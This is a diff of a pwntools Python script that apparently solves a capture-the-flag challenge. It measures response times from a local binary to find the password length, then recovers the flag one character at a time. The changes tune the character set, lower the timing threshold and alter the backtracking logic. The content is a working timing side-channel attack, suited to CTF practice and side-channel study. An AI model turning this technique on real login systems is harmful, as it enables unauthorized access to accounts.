@@ -1,14 +1,14 @@
 from pwn import *
 import datetime
 
-context.binary = "./target/release/timing_attack"
+context.binary = "./target/release/_10_ms_worth_of_sides"
 p = process()
 
 largest = datetime.timedelta()
 pass_len = 0
 
 
-def get_largest_ms():
+def get_pw_len():
     global largest, pass_len
     largest = datetime.timedelta()
     pass_len = 0
@@ -23,7 +23,7 @@ def get_largest_ms():
             pass_len = i
 
 
-get_largest_ms()
+get_pw_len()
 
 print(f"Largest: {largest.microseconds}ms\nlen: {pass_len}")
 
@@ -36,14 +36,13 @@ i_changed = False
 while True:
     # Reset state after 3 failed loops across character set
     if fail_c >= 3:
-        get_largest_ms()
-        known = ""
+        i = len(known)
+        known = known[:-1]
         unknown = "*" * pass_len
-        i = len(known) + 1
         fail_c = 0
         i_changed = False
 
-    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_":
+    for c in "abcdefghijklmnopqrstuvwxyz0123456789{}_":
         key = known + c + unknown[i:]
         try:
             t = datetime.datetime.now()
@@ -53,7 +52,7 @@ while True:
         except EOFError:
             exit(0)
         print(f"{key} {d.microseconds} ({d.microseconds / largest.microseconds})")
-        if d.microseconds / largest.microseconds > 1.04:
+        if d.microseconds / largest.microseconds > 1.01:
             known += c
             largest = d
             i += 1
